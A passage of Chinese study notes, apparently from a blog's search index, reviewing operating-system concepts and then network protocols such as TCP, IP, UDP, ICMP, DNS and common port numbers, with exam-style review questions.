的概念、前趋图与进程图**\n\n**4、原语的概念及进程控制原语的种类**\n\n原语是操作系统中完成一些特定功能的、不可中断的过程\n\n原语的种类： \n\n- 进程控制原语\n- 创建原语（分配PCB及资源）、撤销原语（撤销PCB并归还资源）\n- 阻塞原语（阻塞后的进程只能由其他进程唤醒）\n- 唤醒原语（一般执行此语句的进程与被唤醒进程是合作的并发进程，唤醒原语的最后一步可以转进程调度，也可以返回现行进程）\n\n**5、进程的同步与互斥的概念、临界资源与临界区的概念**\n\n进程的同步：并发进程在一些关键点上可能需要互相等待与互通消息，这种相互制约的等待与互通消息称为进程的同步\n\n进程的互斥：在操作系统中，当某一进程正在访问某一存储区域时，不允许其他进程来读出或者修改存储区的内容，否则就会发生后果无法估计的错误\n\n临界资源：通常把一次仅允许一个进程使用的资源称为临界资源\n临界区：进程访问临界资源的那段代码\n\n**6、信号量及其应用**\n\n**7、线程的概念及种类、引入线程的目的**\n\n线程是进程内的一个相对独立的可调度的执行单元，一个进程可含有多个线程，它们可以并发执行，共享进程的全部资源。\n\n引入线程的目的：减小程序在并发执行时所付出的时空开销，提高操作系统的并发性能。\n\n## 第三章 处理机调度与死锁\n**1、调度的层次与作用**\n\n（1）高级调度（作业调度、长程调度、宏观调度）\n（2）低级调度（进程调度、短程调度）\n（3）中级调度（内存调度）\n\n<img src=\"https://img.jwt1399.top//img/20201220161150.png\" style=\"zoom:50%;\" />\n\n**2、常用调度算法及计算**\n\n- 先来先服务（FCFS）\n- 短作业优先（SJF）\n- 优先级调度算法（PSA）\n- 高响应比优先调度算法（HRRN）\n\n**3、死锁的概念、产生的原因及必要条件**\n\n概念：一组并发进程彼此无休止地等待对方占用的资源，从而造成不能继续向前推进的状态，称为进程的死锁。\n\n产生的原因：并发进程的资源竞争\n\n- 1.由于多数资源是互斥地使用，有多个并发进程时系统资源不足\n- 2.进程推进不合理\n\n必要条件：互斥使用、不可强占、请求和保持、循环等待\n\n- 互斥使用：进程应互斥使用资源，任意时刻一个资源仅为一个进程独占，若另一个进程请求一个已被占用的资源时，就把这个进程置成等待状态，知道占用者释放资源\n- 不可强占：任一进程不能从另一进程那里抢夺资源\n- 请求和保持：一个进程请求资源得不到满足而等待时，不释放已占有的资源\n- 循环等待：存在一个循环等待链，其中，每一个进程分别等待它前一个进程所持有的资源，造成永远等待\n\n**4、处理死锁的基本方法**\n\n`预防死锁、避免死锁、检测死锁、解除死锁 `\n\n![](https://img.jwt1399.top//img/20201220161218.png)\n\n**5、银行家算法及计算**\n\n![](https://img.jwt1399.top//img/20201220161238.png)\n\n## 第四章 存储管理\n\n**1、存储管理的目的及功能**\n\n存储管理的目的：解决多道作业的主存空间的动态分配问题，提高内存利用率并方便用户使用主存\n\n存储管理的功能：地址映射、主存分配、主存保护、虚拟主存\n\n**2、重定位的概念及方法**\n\n重定位的概念：把逻辑地址转换为内存的物理地址的过程\n\n方法：\n\n- 静态重定位：在程序装入过程中、随即进行的地址变换，由装入软件完成\n- 动态重定位：通过一个地址变换机构将虚地址变换为主存的物理地址，并且是在程序执行过程中执行的，需硬件支持\n\n**3、内碎片与外碎片**\n\n内碎片：分配给作业的存储空间中`未被利用的部分`\n外碎片：系统中`无法利用`的小存储块\n\n**4、常用分区分配算法及对应的空闲区排列方式**\n\n首次适应算法：空闲区链表按地址从低到高排序，放入到主存中`第一个足够装入它的地址最低的空闲区。`\n\n- 最佳适应算法：按大小从小到大排序，放到与它`大小最接近的空闲区。`\n- 最坏适应算法：按大小从大到小排序，放到与它所需空间`差距最大的空闲区。`\n\n![](https://img.jwt1399.top//img/20201220161254.png)\n\n**5、基本分页（分段、段页式）的概念、页（段）表的作用、地址变换**\n\n分页式：\n\n- 虚页：程序的地址空间被等分成大小相等的片，称为页面，又称为虚页。\n- 实页：主存被等分成大小相等的片，称为主存块，又称为实页。\n- 页表：为了实现从地址空间到物理主存的映象，系统建立的记录页与内存块之间对应关系的地址变换的机构称为页面映像表，简称页表。\n- 分页系统中，地址变换主要通过页表来实现，故也叫地址变换表或地址映射表。\n- 页表包括页号和块号。\n- 虚地址结构包括：页号+页内位移。变换过程由操作系统完成。\n\n分段式：\n\n- 分段是程序中自然划分的一组逻辑意义完整的信息集合，如数据段、代码段、栈段。\n- 分段式程序地址空间由若干个逻辑分段组成，每个分段有自己的名字，对于一个分段而言，它是一个连续的地址区。\n- 段表包括段号长度和基址。\n- 段式地址结构包括：段号+段内位移。\n\n段页式：\n\n- 在一个分段内划分页面就形成了段页式存储管理。\n\n**6、分页与分段的区别、各自的优缺点**\n\n![](https://img.jwt1399.top//img/20201220161307.png)\n\n**7、快表的作用、内存访问时间的计算**\n\n![](https://img.jwt1399.top//img/20201220161320.png)\n\n**8、虚拟存储器的基本概念、理论依据、基本特征及关键技术**\n\n由操作系统和硬件相配合来完成主存和辅存之间的信息的动态调度。这样的计算机系统好像为用户提供了一个其存储容量比实际主存大得多的存储器，这个存储器称为虚拟存储器。\n存储容量由计算机地址结构和存储大小共同决定\n\n理论依据是程序的局部性特征\n\n基本特征：离散型、多次性、对换性和虚拟性\n其中离散性是其最基本的属性，在离散性的基础上又形成了多次性和对换性两个特征，而虚拟存储器能够表现出的最重要的特征是虚拟性。\n\n关键技术：分页（页表机构、缺页中断、地址变换）\n分段（段表机构、缺段机构、地址变换）\n\n**9、页面置换算法、缺页率计算、LRU 算法的硬件实现方法、抖动、Belady 异常、缺页中断**\n\n用来选择淘汰哪一页的规则叫做置换策略，或称淘汰算法\n\n颠簸又称为“抖动”\n\n简单地说，导致系统效率急剧下降的主存和辅存之间的频繁页面置换现象称为“抖动”\n\n缺页率：\n\n![](https://img.jwt1399.top//img/20201220161336.png)\n\n页面置换算法：\n\n最佳页面置换算法（OPT）、先进先出置换算法（FIFO）、最近最久未使用置换算法（LRU）\n\nBelady异常：指在使用FIFO算法进行内存页面置换时，在未给进程或作业分配足它所要求的全部页面的情况下，有时出现的分配的页面数增多，缺页次数反而增加的奇怪现象。\n\n缺页中断：\n\n![](https://img.jwt1399.top//img/20201220161350.png)\n\n\n查找页表时，中断为1，页号对应的快不在主存中，发生缺页中断。此时用户程序被中断，控制权转到操作系统的调页程序，将页面从页表提供的盘区地址调入主存的某块中，并更新页表。\n\nLRU算法的硬件实现方法\n\n![image-20200320092127174](https://img.jwt1399.top//img/20201220161412.png)\n\n![](https://img.jwt1399.top//img/20201220161426.png)\n\n![](https://img.jwt1399.top//img/20201220161436.png)\n\n\n## 第五章 设备管理\n**1、设备管理的任务、功能及目标**\n\n任务：实现外部设备的共享，并有效地完成各自所需的传输工作。\n\n功能：状态跟踪（动态记录各种设备的状态）\n设备分配与回收（静态分配：程序进入系统时进行分配，退出系统时收回全部资源\n动态分配：进程提出申请时进行分配，使用完毕后立即收回）\n设备控制（实施设备驱动和中断处理的工作）。\n\n目标：提高设备利用率、方便用户使用。\n\n**2、I/O 设备的分类，设备、控制器及通道的关系**\n\n分类：\n\n- (1) 存储设备\n  - 存储设备又称块设备，是存储信息的设备，如：磁盘、磁鼓 (以块为单位传输信息) 。\n\n- (2) 输入输出设备\n  - 输出设备又称字符设备，能将信息从计算机外部输入到机内，或反之，如：键盘、显示器、打印机 (以字符为单位传输信息) 。\n\n- (3) 通信设备\n  - 通信设备负责计算机之间的信息传输，如调制解调器、网卡等。\n\n设备是由设备控制块表示的一个实体。\n\n控制器是用于操作端口、总线或设备的一组电子器件。用于控制设备与主机通信与数据交换。\n\n通道是用来控制外部设备于主存之间进行成批数据传输的部件，又称为I/O处理机。它接送CPU命令又独立于CPU工作。\n\n**3、通道的基本概念及分类**\n\n概念：通道是用来控制外部设备与主存之间进行成批数据传输的部件，又称为I/O处理机\n\n分类：字节多路通道、数组选择通道、数组多路通道\n\n![](https://img.jwt1399.top//img/20201220161447.png)\n\n**4、I/O 控制方式及推动发展的因素、各自适用的场合及设备类型**\n\n![](https://img.jwt1399.top//img/20201220161459.png)\n\n**5、缓冲区的概念、分类及引入目的**\n\n缓冲是两种不同速度的设备之间传输信息时平滑传输过程的常用手段。\n分为缓冲器（硬件存储装置）和软件缓冲（临时存放I/O数据的一块存储区域）。\n用于处理数据流的生产者与消费者间的速度差异，协调传输数据大小不一致的设备，应用程序的拷贝语义。\n\n目的：\n\n- （1）缓和CPU和I/O设备之间速度不匹配的矛盾\n- （2）减少中断CPU的频率，放宽对CPU中断响应时间的限制\n- （3）提高CPU和I/O设备的并行性\n\n**6、I/O 软件的层次、各层主要功能、设备独立性的概念**\n\n请求I/O的进程、I/O过程、设备处理进程、中断处理程序。\n\n所谓设备独立性是指，用户在程序中使用的设备与实际使用的设备无关，也就是在用户程序中仅使用逻辑设备名。\n\n**7、SPOOLING 技术的概念、作用及 SPOOLING 系统的组成**\n\n利用通道和中断技术，在主机控制之下，由通道完成输入输出工作。系统提供一个软件系统 (包括预输入程序、缓输出程序、井管理程序、预输入表、缓输出表)。它提供输入收存和输出发送的功能，使外部设备可以并行操作。这一软件系统称为SPOOLING系统。\n\nSPOOLING系统提供外围设备同时联机操作的功能，提高独占设备利用率。\n\n组成包括预输入程序、缓输出程序、井管理程序、预输入表、缓输出表；\n\n**8、磁盘访问过程及访问时间的确定、块号与柱面、磁道、扇区号的对应关系、磁盘调度算法及其计算；扇区的优化**\n\n## 第六章 文件管理\n\n**1、文件系统的组成、功能**\n\n组成：管理文件所需的数据结构、管理程序、一组操作。\n功能：用户角度—“按名存取”；系统角度—辅存空间管理、构造文件结构、提供文件存取方法、文件保护、提供文件共享功能、提供文件操作命令。\n\n**2、打开、关闭操作的目的**\n\n所谓打开文件就是把该文件的有关目录表目复制到主存中约定的区域，建立文件控制块，建立用户和这个文件的联系。\n所谓关闭文件就是用户宣布这个文件当前不再使用，系统将其在主存中的文件控制块删去，因而也就切断了用户同这个文件的联系。\n\n**3、文件逻辑结构、物理结构的分类**\n\n文件逻辑结构是从用户角度看到的文件面貌。即用户对信息进行逻辑组织形成的文件结构。包括流式文件、记录式文件。\n文件的物理结构是信息在物理存储器上的存储方式，是数据的物理表示和组织。包括连续文件、串联文件、索引文件结构。\n\n**4、FAT 表的作用、FAT 表大小的计算**\n\n**5、混合索引分配方式的结构及相关计算**\n\n**6、文件的目录结构、索引节点及文件控制块的作用**\n\n文件目录是记录文件的名字、存放地址及其他有关文件的说明信息和控制信息的数据结构。\n文件目录将每个文件的符号名和他们在辅存空间的物理地址与有关文件情况的说明信息联系起来了。\n分为一级文件目录和树形文件目录。\n\nUNIX系统把文件目录项中除了名字以外的信息全部存放到一个磁盘的数据块上，这种数据块就是文件索引节点 (indexnode)，简称i节点，又称为磁盘索引节点。在目录项中只有文件的名字和对应i节点的编号。\n\n文件控制块记录文件当前各种状态。\n\n**7、文件空闲区的管理方法（空闲表、空闲链、位示图与成组链接法）**\n\n空闲磁盘块管理采用成组链接法，即将空闲表和空闲链两种方法相结合。系统初启时，文件存储区是空闲。将空闲块从尾倒向前，每100块分为一组 (注：最后一组为99块)，每一组的最后一块作为索引表，用来登记下一组100块的物理块号和块数。那么，最前面的一组可能不足100块，这一组的物理块号和块数存放在管理块的s_free[100]和s_nfree中。        \n\n## 操作系统参考复习题\n\n##### 操作系统的基本功能包括什么内容？ （填）\n处理机管理、存储器管理、设备管理、文件系统管理，为用户使用操作系统提供了用户接口\n##### 什么是作业调度？作业调度算法包括几种？(判、填） \n作业调度称为宏观调度，其任务是对提交给系统的、存放在辅存设备上的大量作业以一定的策略进行挑选，分配主存等必要的资源，建立作业对应的进程，使其投入运行。\n\n先来先服务，段作业优先，最高响应比优先\n\n##### 在操作系统的处理器管理中，每一个进程唯一的标志是什么？ （选）\nPCB\n##### 什么是临界资源？有什么特点？ （简答）\n一段时间内只允许一个进程使用的资源\n##### 什么是共享变量？ （判）\n##### 进程所请求一次打印输出结束后，将使进程状态从什么态变为什么态？（选）\n等待态变为就绪态\n##### 进程控制块中的现场信息是保存的什么信息？ （选）\n\n工作寄存器、指令计数器以及程序状态字\n##### 什么是进程同步？进程同步是指进程间在逻辑上的什么关系？（简答题）\n并发进程在一些关键点上可能需要互相等待与互通消息\n直接制约\n\n##### 什么是原语？P、V 操作是原语吗？他们的物理意义是什么？  （选择、判断、填空）\n\n原语是操作系统中完成一些特定功能的、不可中断的过程\nP、V操作是不可中断的程序段，称为原语\n\n##### 怎么用信号量和 P、V 操作原语来实现对进程同步的控制（要写出代码）。（综合）\n![](https://img.jwt1399.top//img/20201220161523.png)\n\n![](https://img.jwt1399.top//img/20201220161538.png)\n\n![](https://img.jwt1399.top//img/20201220161552.png)\n\n##### 什么是死锁？产生死锁的条件是什么？解决死锁的方法一般有那几种?  （简答）\n概念：一组并发进程彼此无休止地等待对方占用的资源，从而造成不能继续向前推进的状态，称为进程的死锁。\n死锁产生的条件：互斥条件、不可强占、请求和保持、循环等待\n\n解决死锁的方法：预防死锁、避免死锁、检测死锁、解除死锁\n（1）\t预防死锁：打破死锁发生的四个必要条件之一\n![](https://img.jwt1399.top//img/20201220161603.png)\n（2）\n\n![](https://img.jwt1399.top//img/20201220161636.png)\n\n##### 什么是线程？在操作系统中引入线程的主要目的是？线程与进程的区别是？ \n线程是进程的内的一个相对独立的可调度的执行单元，一个进程可含有多个线程，它们可以并发执行，共享进程的全部资源。\n\n引入线程的目的：减小程序在并发执行时所付出的时空开销，提高操作系统的并发性能。\n\n进程是任务调度的单位，也是系统资源的分配单位；而线程是进程中的一条执行路径，当系统支持多线程处理时，线程是任务调度的单位，但不是系统资源的分配单位。线程完全继承父进程占有的资源，当它活动时，具有自己的运行现场。\n##### 什么是静态地址映射？它指的是？\n在程序装入过程中随即进行的地址变换方式成 为静态地址映射或静态重定位。\n指当将一地址空间装入到主存中的任一位置时，若由主存装入程序对有关地址部分进行调整，则这次确定下来的地址就不再改变。\n\n##### 分区存储管理有什么特点？有什么内存分配算法？各有什么特点？（能对分配算法进行定性、定量分析） （简答）\n##### 分页式存储管理中，地址转换工作是怎样完成的？ (简答)\n\n##### 什么是分段式存储管理？分段式存储管理在地址分配上有什么基本特征？\t（简答）   \n\n##### 段页式存储管理中，如何从主存中取指令或取操作数？ （选、填空）\n\n##### 请求式段页内存管理页面切换算法有哪些？（能对切换算法进行分析）    \n\n##### 什么是管态？什么是目态？中央处理器处于目态时，执行什么指令将产生“非法操作”事件？ （选、填、判）\n##### 磁盘文件的物理结构有哪几种？那种结构既适合顺序存取，又方便随机存取？ （填、简答）\n##### 为了实现设备的独立性，操作系统让用户使用什么样的设备名？ （选）\n##### 文件系统的多级目录结构有什么特点？ （选、填）\n##### 什么是位示图方法？操作系统可用位示图方法解决什么问题？ （简答）\n##### 什么是文件系统？文件系统中文件为什么要按照名字存取？  （简答）\n##### 什么是虚拟设备？虚拟设备是怎么实现的？有什么意义？（简答） \n##### 存放在磁盘、磁带上的文件，常采用的什么样的物理结构（选）\n##### 什么SPOOL 技术？SPOOL 系统利用什么存放作业信息和作业执行结果。（简答、填空）\n\n##### 操作系统为了调节不同部件的传输速度，可以采用缓冲技术，缓冲技术包含哪些基本技术？有什么特点？（简答）\n##### 如果 I/O 设备与存储设备进行数据直接交换，称为什么方式？引起中断发生的事件称为？ （选、填）\n\n##### 文件系统设置文件目录的目的是什么? 文件目录组织都有哪几种形式? （判、填空、简答）\n##### 在一个段式存储管理系统中，段表内容如下： （综合）\n![](https://img.jwt1399.top//img/20201220161711.png)\n\n\n##### 试求下述逻辑地址对应的物理地址是什么？ \n![](https://img.jwt1399.top//img/20201220161701.png)\n##### 在单道系统中，设有四道作业，它们的提交时间和执行时间如下表：  （综合）\n\n![](https://img.jwt1399.top//img/20201220161727.png)\n\n##### 请采用 FCFS,SJF,高响应比优先调度算法分别补充完善上表，并计算平均周转时间和平均带权周转时间。（所有计算最多保留 2 位小数）\n\n","tags":["操作系统"],"categories":["CS基础"]},{"title":"网络协议分析复习","url":"/posts/49277.html","content":"#### 1、必须掌握ARP协议的格式、工作原理和过程、功能\n\nARP协议的格式：\n![](https://i.loli.net/2019/11/20/mePwdyTufKz7rgl.png)\n![](https://i.loli.net/2019/11/20/SozTD5FNbrCedaW.png)\n[arp报文格式解析](https://www.cnblogs.com/perilong16/p/10933852.html)\n\n#### 2、TCP/IP协议簇的层次及OSI/RM模型的网络层次及各层的主要作用及各层的主要协议\n\n![](https://i.loli.net/2019/11/20/dP3Cn1O8IYiDrwL.png)\n\n#### 3、面向连接、无连接的最主要区别；哪些协议是面向连接的？哪些协议是无连接的？\n\n面向连接分为三个阶段，而面向无连接没有这么多阶段，它直接进行数据传输。 \n面向连接的通信具有数据的保序性， 而面向无连接的通信不能保证接收数据的顺序与发送数据的顺序一致。\n面向连接：TCP\n无连接：UDP、IP\n\n#### 4、熟悉TCP协议首部各字段含义及作用\n\n![](https://i.loli.net/2019/11/20/Fi5tXYTleMoL6gd.png)\n\n```\n􀀁\t源端口：这是源设备发出TCP 段的进程的 16 比特端口号。\n􀀁\t目的端口：这是目的设备上作为本报文最终希望的接收方进程的 16 比特端口号。\n􀀁\t序列号：在正常传输情况下，这是本段数据第一个字节的序列号，在连接请求 SYN报文中，该字段携带了源 TCP 的 ISN，数据第一个字节的序列号将被指定为紧跟该字段内容的下一个编号。\n􀀁\t确认序列号：若 ACK 比特置位，说明本段充当一个确认，该字段含有源正在期待的目的地将要发送下一个序列号。\n􀀁\t数据偏移：该项详细说明了 TCP 首部含有多少个 32 比特字的数据，换句话说，该值乘以 4 就等于首部字节数，而后者必须总是 4 的倍数，该字段称为数据偏移是因为它指明数据起点距TCP 段开头偏移了多少个 32 比特。\n􀀁\t保留：该字段留给将来使用，发送时置 0。\n􀀁\tURG：紧急指针(urgent pointer)有效，置为 1 时，说明数据段的优先数据传输特性已经被激活，且紧急指针字段有效。\n􀀁\tACK：确认序号有效，置为 1 时，说明数据段携带一个确认，确认编号字段值有效且携带着期望从数据段目的地收到的下一个序列号。\n􀀁\tPSH：接收方应该尽快将这个报文段交给应用层，数据段发送方正在使用 TCP 推特性，请求立即将段中数据推向接收设备上的应用程序。\n􀀁\tRST：重建连接\n􀀁\tSYN：同步序号用来发起一个连接。序列号字段含有发送方的 ISN。\n􀀁\tFIN：发送端正在请求连接关闭。\n􀀁\t窗口：该字段指出本端的发送方愿意从接收方处一次接受多少个8 比特数据。它通常等于分配给该条连接用以接受数据缓冲区的当前长度。\n􀀁\t校验和：16 比特检验和\n􀀁\t紧急指针：该字段与 URG 控制比特联合用于优先数据传输，该字段包含了紧急数据最后一个字节的序列号。\n```\n#### 5、TCP的特点及工作原理\n\n特点：\n（1）面向连接的运输层协议；\n（2）基于字节流的方式；\n（3）可靠交付的服务；\n（4）提供全双工通信\n（5）通信连接维护是面向通信的两个端点的，而不考虑中间网段和节点。\n\n#### 6、记住IP报文首部信息各字段及各字段的作用\n\n![](https://i.loli.net/2019/11/20/56YifShH1jxopdq.png)\n\n```\n􀀁\t版本：长度为 4 比特，含义为版本号，对于 IPv4 来说，版本号为 4。\n􀀁\t报头长度：报头长度字段为 4 比特，用于表示 IP 报头长度，在 IPv4 中，由于选项字段长度可变，因此，报头长度并不固定，报头字节长度为这一字段值的4 倍。\n􀀁\t业务类型：业务类型字段长度为8 比特，主要用于标识 QOS 服务等级。\n􀀁\t总长度：总长度字段共16 比特，因此 IP 报的最大长度为 65535 字节。\n􀀁\t标识符（Identifier）：长度16 比特。该字段和标识及分段偏移字段联合使用，对大的上层数据包进行分段（fragment）操作。\n􀀁\t标记（Flags）：长度 3 比特。该字段第一位不使用，第二位是 DF 位，DF 位设为1 时表明路由器不能对该上层数据包分段。如果一个上层数据包无法在不分段的情况下进行转发，则路由器会丢弃该上层数据包并返回一个错误信息。第三位是MF位，当路由器对一个上层数据包分段，则路由器会在除了最后一个分段的 IP 包的包头中将 MF 位设为1。\n􀀁\t分段偏移（Fragment Offset）：长度 13 比特。用于指明分片 IP 包在原 IP 包中的偏移量。由于 IP 包在网络上传送的时候不一定能按顺序到达，这个字段保证了目标路由器在接受到 IP 包之后能够还原分段的上层数据包。当某个包含分段的上层数据包的 IP 包在传送时丢失，则整个一系列包含分段的上层数据包的 IP 包都会被要求重传。\n􀀁\t生存时间（TTL）：长度8 比特。当 IP 包进行传送时，先会对该字段赋予某个特定的值。当 IP 包经过每一个路由器的时候，路由器会将 IP 包的TTL 值减少1。如果TTL 减少为 0，则该 IP 包会被丢弃。这个字段可以防止由于路由故障而导致 IP 包在网络中不停被转发。\n􀀁\t协议号（Protocol）：长度8 比特。标识了上层所使用的协议。\n􀀁\t报头校验和（Header Checksum）：长度16 位，由于 IP 包头是变长的，所以提供一个头部校验来保证 IP 包头中信息的正确性。\n􀀁\t源和目标地址（Source and Destination Addresses）：这两个地段都是 32 比特。标识了这个 IP 包的起源和目标地址。\n􀀁\t可选项（Options）：这是一个可变长的字段。该字段由起源设备根据需要改写。\n```\n#### 7、OSI参考模型中，各层的数据传输单元\n\n物理层：比特\n数据链路层：帧\n网络层：数据包\n传输层：数据段\n会话层、表示层、应用层：应用数据\n\n#### 8、tracert命令工作原理及与ICMP的关系，掌握ICMP协议的作用\n\n```\ntracert命令工作原理---linux 上为traceroute\n\nTracert 命令用 IP 生存时间 (TTL) 字段和 ICMP 错误消息来确定从一个主机到网络上其他主机的路由。\n\n首先，tracert送出一个TTL是1的IP 数据包到目的地，当路径上的第一个路由器收到这个数据包时，它将TTL减1。此时，TTL变为0，所以该路由器会将此数据包丢掉，并送回一个「ICMP time exceeded」消息（包括发IP包的源地址，IP包的所有内容及路由器的IP地址），tracert 收到这个消息后，便知道这个路由器存在于这个路径上，接着tracert 再送出另一个TTL是2 的数据包，发现第2个路由器...... tracert 每次将送出的数据包的TTL 加1来发现另一个路由器，这个重复的动作一直持续到某个数据包 抵达目的地。当数据包到达目的地后，该主机则不会送回ICMP time exceeded消息，一旦到达目的地，由于tracert通过UDP数据包向不常见端口(30000以上)发送数据包，因此会收到「ICMP port unreachable」消息，故可判断到达目的地。\n\ntracert 有一个固定的时间等待响应(ICMP TTL到期消息)。如果这个时间过了，它将打印出一系列的*号表明：在这个路径上，这个设备不能在给定的时间内发出ICMP TTL到期消息的响应。然后，Tracert给TTL记数器加1，继续进行。（注意：默认是最多30跳就结束 ）\n```\n![](https://i.loli.net/2019/11/22/aFh6743EwXjfD1T.png)\nICMP协议的作用:检测网络通信故障和实现链路追踪，负责提供TCP/IP网络上的设备、服务以及路由器可用性的信息。\n\n#### 9、必须掌握UDP协议首部格式及各字段的位置及作用，能根据给出的首部十六进制值来说明各字段的值代表的具体含义，从而分析出UDP报文的作用。\n\n**UDP的首部格式:**\n       用户数据报UDP有两个字段：数据字段和首部字段。首部字段很简单，只有8个字节，由四个字段组成，`每个字段的长度都是两个字节`。各字段的意义如下：\n\n```\n(1)  源端口      源端口号。在需要对方回信时选用。不需要时可用全0。\n(2)  目的端口    目的端口号。 这在终点交付报文时必须要使用到。\n(3)  长度        UDP用户数据报的长度，其最小值是8（仅有首部）\n(4)  检验和      检测UDP用户数据报在传输中是否有错。有错就丢弃。\n```\n![](https://i.loli.net/2019/11/23/Bb8st4IPhwELpDy.png)\n 一个UDP模块必须提供产生和验证检验和的功能，但是一个应用程序在使用UDP服务时，可以自由选择是否要求产生校检和。在计算校检和时，要在UDP用户数据报之前增加12字节的伪首部。校检和就是按照这个临时的UDP用户数据报来计算的。\n\n       UDP计算校检和的方法和计算IP数据报首部校检和的方法相似。但不同的是：IP数据报的校检和只校检IP数据报的首部，但UDP的校检和使把首部和数据部分一起都校检。\n\n#### 10、网络地址、子网掩码的计算方法；子网广播地址、网关等概念\n\n[IP地址、子网掩码和网络号的计算](https://zhuanlan.zhihu.com/p/32361762)\n[子网掩码的计算及与子网数、主机数关系](https://blog.csdn.net/yinshitaoyuan/article/details/51782330)\n对于A类地址来说，默认的子网掩码是255.0.0.0；对于B类地址来说默认的子网掩码是255.255.0.0；对于C类地址来说默认的子网掩码是255.255.255.0\n网络流量分为：广播、组播、单播\n广播：数据包会被发送到一个网段的所有端口，在一个IP网络范围中最大的IP地址是被保留作为`广播地址`\n例如：IP范围192.168.0.xxx,子网掩码是255.255.255.0，则广播地址为192.168.0.255\n组播：一种将单一来源数据包同时传输给多个目标的通信方式\n单播：数据包会从一台计算机直接传输到另一台计算机\n网关:网关（Gateway）就是一个网络连接到另一个网络的“关口”。也就是网络关卡。\n\n#### 11、 IPv4协议的校验和域\n\nIP数据报的校验和只检验IP数据报的首部。\n\n当发送IP包时，需要计算IP报头的校验和：\n把校验和字段置为0；\n对IP头部中的每16bit进行二进制求和；\n如果和的高16bit不为0，则将和的高16bit和低16bit反复相加，直到和的高16bit为0，从而获得一个16bit的值；\n将该16bit的值取反，存入校验和字段。\n\n#### **12、PPP协议**\n\n[PPP协议](https://blog.csdn.net/windeal3203/article/details/51066331)\n计算机网络76页\n\n#### **13、IPv4特点**\n\nIPv4地址可以分为网络地址和主机地址两部分,IPv4采用32位地址长度\n①IP协议是一种无连接、不可靠的分组传送服务的协议。\n②IP协议是点-点线路的网络层通信协议。\n③IP协议屏蔽了网络在数据链路层、物理层协议与实现技术上的差异。\n[OSI参考模型——网络层：IPv4协议和IPv6协议详解](https://blog.csdn.net/jeffleo/article/details/53933937)\n\n#### **14、Ping与ICMP**\n\nPing命令是基于ICMP协议的，主要目的是测试设备之间的通信。它先发送一个ICMP请求给目的地址，ICMP协议规定目的主机必须返回ICMP回送应答消息给主机。 \n\n#### **15、了解TCP与流量控制**\n\n如果主机A 一直向主机B发送数据，不考虑主机B的接受能力，则可能导致主机B的接受缓冲区满了而无法再接受数据，从而会导致大量的数据丢包，引发重传机制。而在重传的过程中，若主机B的接收缓冲区情况仍未好转，则会将大量的时间浪费在重传数据上，降低传送数据的效率。\n所以引入流量控制机制，主机B通过告诉主机A自己接收缓冲区的大小，来使主机A控制发送的数据量。流量控制与TCP协议报头中的窗口大小有关。\nTCP报头中的16位窗口大小，指自己接收缓冲区的剩余大小。\n![2018070917483846.png](https://i.loli.net/2019/11/21/LnHr78w1JAUcMy4.png)\n\n#### **16、TCP和UDP端口**\n\n```\n43  TCP  whois协议\n57  TCP  MTP，邮件传输协议\n80  TCP  HTTP协议\n88  TCP  Kerberos-认证代理\n107  TCP  远程Telnet协议\n109  TCP  POP（邮局协议）\n110  TCP  POP3（邮局协议第三版）\n69  UDP  TFTP（小型文件传输协议）\n```\n#### **17、SYN，ACK，RST，URG等的使用**\n\n```\nURG:表示本报文段中发送的数据是否包含紧急数据。URG=1，表示有紧急数据。紧急指针字段只有当URG=1时才有效。\nACK：表示是否前面的确认号字段是否有效。ACK=1，表示有效。TCP规定，连接建立后，ACK必须为1。\nPSH：告诉对方收到该报文段后是否应该立即把数据推送给上层。如果为1，则表示对方应当立即把数据提交给上层，而不是缓存起来。\nRST：只有当RST=1时才有效。如果收到一个RST=1的报文，说明与主机的连接出现了严重错误，必须释放连接，然后再重新建立连接。或者说明上次发送给主机的数据有问题，主机拒绝响应。\nSYN：在建立连接时使用，用来同步序号。当SYN=1，ACK=0时，表示这是一个请求建立连接的报文段；当SYN=1，ACK=1时，表示对方同意建立连接。只有在前两次握手中SYN才置为1。\nFIN：标记数据是否发送完毕。如果FIN=1，则可以释放连接。\n```\n[TCP中的URG与PSH](https://blog.csdn.net/superficial_/article/details/74857584)\n[TCP的状态 (SYN, FIN, ACK, PSH, RST, URG)](https://www.jianshu.com/p/440cd1e7a81a)\n\n#### **18、常见端口号及对应的协议**\n\n![2019-11-20_160111.png](https://i.loli.net/2019/11/20/a1X3KdWRIv8o5pH.png)\n\n#### **19、熟悉FTP、DNS、Telnet、电子邮件**\n\n[FTP:21](https://blog.csdn.net/ZWE7616175/article/details/81356015)\n**DNS:53**\n提供域名到IP地址的解析\nDNS服务器分为4种：本地域名服务器（也称默认域名服务器），根域名服务器，顶级域名服务器，权限域名服务器\n查询过程：主机向本地域名服务器进行递归查询，即本地域名服务器如果不知道域名的IP，就以DNS客户的身份向其他根域名服务器发起查询。本地域名服务器向根域名服务器发起的查询为迭代查询，即要么返回IP地址，要么返回下一个查询的DNS服务器，由本地域名服务器再进行查询。\n**Telnet:** 23\n什么是telnet服务：远程登录的服务，管理服务器的操作\n原理\n1）与远程主机建立一个TCP连接，用户必须知道远程主机的Ip地址或域名；\n2）将本地终端上输入的用户名和口令及以后输入的任何命令或字符以NVT（Net Virtual Terminal）格式传送到远程主机。该过程实际上是从本地主机向远程主机发送一个IP数据包；\n3）将远程主机输出的NVT格式的数据转化为本地所接受的格式送回本地终端，包括输入命令回显和命令执行结果；\n4）最后，本地终端对远程主机进行撤消连接。该过程是撤销一个TCP连接。\nNVT格式进行发送\n**电子邮件:(SMTP:25,POP3:110,IMAP:143)**\nSMTP发送，POP3和IMAP读取\n由发件人写邮件，用SMTP发到发送方邮件服务器。\n发送方邮件服务器与接收方邮件服务器建立TCP连接，发邮件。\n收件人使用POP3读取邮件。\n\n#### **20、网络分流器分类**\n\n网络分流器类型按速度分四种：\n千兆的网络分流器，10Ｇ的网络分流器，40Ｇ的网络分流器，100Ｇ的网络分流器\n网络分流器按网络技术分四种：\nＰＯＳ技术，ＬＡＮ技术，以太网技术，ＷＡＮ技术\n网络分流器按外形来分两种：\n盒式1Ｕ设备，ＡＴＣＡ设备\n网络分流器如果按功能划分：\n通用型汇聚分流设备，警口设备，Ｄ设备，定制设备等\n网络分流器如果按网络来分：\n移动互联网网络分流器，固网网络分流器\n\n#### 